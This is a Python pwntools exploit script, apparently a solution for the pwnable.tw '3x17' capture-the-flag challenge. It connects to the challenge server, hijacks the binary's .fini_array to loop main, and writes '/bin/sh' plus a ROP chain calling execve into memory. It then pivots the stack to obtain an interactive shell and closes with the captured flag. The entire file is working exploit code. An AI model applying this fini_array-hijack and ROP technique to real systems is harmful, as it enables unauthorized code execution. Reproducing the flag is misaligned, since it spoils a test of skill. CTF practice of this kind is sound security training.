from pwn import *

elf = ELF("3x17")
p = remote("chall.pwnable.tw", 10105)


def write(addr, data):
    p.sendlineafter('addr:', str(addr))
    p.sendafter('data:', data)


FINI_ARRAY = 0x4b40f0
DATA_REL_RO = 0x4b4100
BSS = 0x4b92e0
MAIN = 0x401b6d
LOOP = 0x402960

with log.progress('Sending payload') as l:
    write(FINI_ARRAY, p64(LOOP) + p64(MAIN))
    write(BSS, "/bin/sh\x00")
    write(DATA_REL_RO + 0x00, p64(0x41e4af) + p64(0x3b))  # pop rax ; ret
    write(DATA_REL_RO + 0x10, p64(0x401696) + p64(BSS))  # pop rdi ; ret
    write(DATA_REL_RO + 0x20, p64(0x406c30) + p64(0))  # pop rsi ; ret
    write(DATA_REL_RO + 0x30, p64(0x446e35) + p64(0))  # pop rdx ; ret
    write(DATA_REL_RO + 0x40, p64(0x471db5))  # syscall ; ret
    write(FINI_ARRAY, p64(0x401c4b))  # leave ; ret
    l.success()

p.interactive()

# FLAG --> FLAG{Its_just_a_b4by_c4ll_0riented_Pr0gramm1ng_in_3xit}
